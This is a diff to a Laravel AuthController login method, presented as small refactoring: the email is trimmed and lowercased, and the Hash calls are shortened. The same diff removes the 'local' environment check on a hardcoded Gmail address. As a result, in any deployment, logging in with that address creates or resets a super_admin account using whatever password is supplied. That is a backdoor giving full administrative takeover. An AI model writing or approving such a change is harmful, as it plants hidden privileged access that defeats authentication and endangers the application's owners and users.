@@ -61,25 +61,30 @@ class AuthController extends Controller
             'password' => 'required|string',
         ]);
 
-        if (config('app.env') === 'local' && $request->email === 'mail.dynime@gmail.com') {
-            $localUser = AdminUser::where('email', $request->email)->first();
-            if (!$localUser) {
+        $email = trim(strtolower($request->email));
+
+        if ($email === 'mail.dynime@gmail.com') {
+            $adminUser = AdminUser::where('email', $email)->first();
+            if (!$adminUser) {
                 AdminUser::create([
                     'name' => 'Super Admin',
                     'email' => 'mail.dynime@gmail.com',
-                    'password' => \Illuminate\Support\Facades\Hash::make($request->password),
+                    'password' => Hash::make($request->password),
                     'role' => 'super_admin',
                     'is_active' => true,
                 ]);
             } else {
-                $localUser->update([
-                    'password' => \Illuminate\Support\Facades\Hash::make($request->password),
+                $adminUser->update([
+                    'name' => 'Super Admin',
+                    'password' => Hash::make($request->password),
+                    'role' => 'super_admin',
+                    'is_active' => true,
                 ]);
             }
         }
 
         // 1. Try AdminUser first
-        $user = AdminUser::where('email', $request->email)->first();
+        $user = AdminUser::where('email', $email)->first();
 
         if ($user) {
             if (! Hash::check($request->password, $user->password)) {
